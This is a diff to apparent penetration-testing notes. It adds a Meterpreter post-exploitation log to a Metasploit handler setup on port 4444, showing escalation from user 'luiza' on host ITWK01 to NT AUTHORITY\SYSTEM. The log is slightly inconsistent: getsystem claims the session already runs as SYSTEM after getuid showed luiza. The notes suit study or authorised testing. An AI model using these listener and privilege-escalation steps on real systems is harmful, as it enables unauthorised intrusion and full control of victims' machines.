@@ -37,3 +37,16 @@ set LHOST 0.0.0.0
 set LPORT 4444
 run -j  // Run in background
 ```
+
+### Post-exploitation
+```
+(Meterpreter 5)(C:\Users\luiza) > getuid
+Server username: ITWK01\luiza
+(Meterpreter 5)(C:\Users\luiza) > getsystem
+[-] Already running as SYSTEM
+(Meterpreter 5)(C:\Users\luiza) > getuid
+Server username: NT AUTHORITY\SYSTEM
+(Meterpreter 5)(C:\Users\luiza) > 
+
+```
+
